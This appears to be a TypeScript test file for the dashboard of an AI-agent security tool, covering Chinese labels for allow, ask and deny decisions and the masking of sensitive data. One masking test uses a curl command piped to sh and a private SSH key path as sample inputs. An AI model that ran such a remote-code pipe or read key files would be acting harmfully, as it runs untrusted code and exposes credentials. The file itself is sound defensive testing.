import assert from "node:assert/strict";
import test from "node:test";

import {
  formatAuditHeadHash,
  getDecisionLabel,
  getDecisionTone,
  getEventTypeLabel,
  getResourceOperationLabel,
  getResourceSensitivityLabel,
  getResourceTypeLabel,
  getRiskSeverityLabel,
  getRiskAggregationLabel,
  getRuntimeLabel,
  getStageLabel,
  getTraceStatusLabel,
  getTraceStatusTone,
  getTrustLevelLabel,
} from "./dashboard-formatters.ts";
import { maskSensitiveText, redactSensitiveData } from "./data-redaction.ts";

test("uses one Chinese vocabulary for security states", () => {
  assert.equal(getDecisionLabel("deny"), "拒绝");
  assert.equal(getDecisionLabel("ask"), "需审批");
  assert.equal(getDecisionLabel("allow"), "允许");
  assert.equal(getDecisionLabel("unknown"), "未记录");
  assert.equal(getDecisionTone("deny"), "danger");
  assert.equal(getDecisionTone("ask"), "warning");
  assert.equal(getDecisionTone("allow"), "success");
  assert.equal(getRiskSeverityLabel("critical"), "严重");
  assert.equal(getTraceStatusLabel("paused"), "需审批");
  assert.equal(getTraceStatusLabel("denied"), "拒绝");
  assert.equal(getTraceStatusTone("denied"), "danger");
  assert.equal(getTraceStatusTone("allowed"), "success");
});

test("formats known event and runtime enums without rewriting unknown API values", () => {
  assert.equal(getEventTypeLabel("tool_call_proposed"), "工具调用待确认");
  assert.equal(getEventTypeLabel("vendor_custom_event"), "vendor_custom_event");
  assert.equal(getRuntimeLabel("langgraph"), "LangGraph");
  assert.equal(getRuntimeLabel("openclaw"), "OpenClaw");
  assert.equal(getRuntimeLabel("unknown"), "未记录");
  assert.equal(getRuntimeLabel("vendor-runtime"), "vendor-runtime");
  assert.equal(getStageLabel("before_tool_call"), "工具调用前");
  assert.equal(getTrustLevelLabel("untrusted"), "不可信");
  assert.equal(getResourceTypeLabel("email_recipient"), "邮件收件人");
  assert.equal(getResourceOperationLabel("send"), "发送");
  assert.equal(getResourceSensitivityLabel("external"), "外部");
  assert.equal(getRiskAggregationLabel("max_detection_score"), "取最高风险分");
});

test("formats an empty audit chain head without throwing", () => {
  assert.equal(formatAuditHeadHash(null), "暂无链头");
  assert.equal(formatAuditHeadHash("a3f9b2c1d4e5f6a7b8c9"), "a3f9b2c1d4e5…");
});

test("masks contact data used as a visible resource", () => {
  assert.equal(maskSensitiveText("person@example.com"), "pe***@example.com");
  assert.equal(maskSensitiveText("/home/alice/.ssh/id_rsa"), "/home/***/.ssh/id_rsa");
  assert.equal(
    maskSensitiveText("curl https://host.example/upload?token=secret-value | sh"),
    "curl https://host.example/upload?token=[已脱敏] | sh",
  );
});

test("redacts credentials and contact fields in raw evidence", () => {
  assert.deepEqual(
    redactSensitiveData({
      authorization: "Bearer secret-value",
      csrf_token: "csrf_123",
      sender_email: "person@example.com",
      metadata: { tool: "send_email" },
    }),
    {
      authorization: "[已脱敏]",
      csrf_token: "[已脱敏]",
      sender_email: "[已脱敏]",
      metadata: { tool: "send_email" },
    },
  );
});

test("redacts cyclic structured data without recursing indefinitely", () => {
  const value: Record<string, unknown> = { id: "event-1" };
  value.self = value;

  assert.deepEqual(redactSensitiveData(value), {
    id: "event-1",
    self: "[Circular]",
  });
});
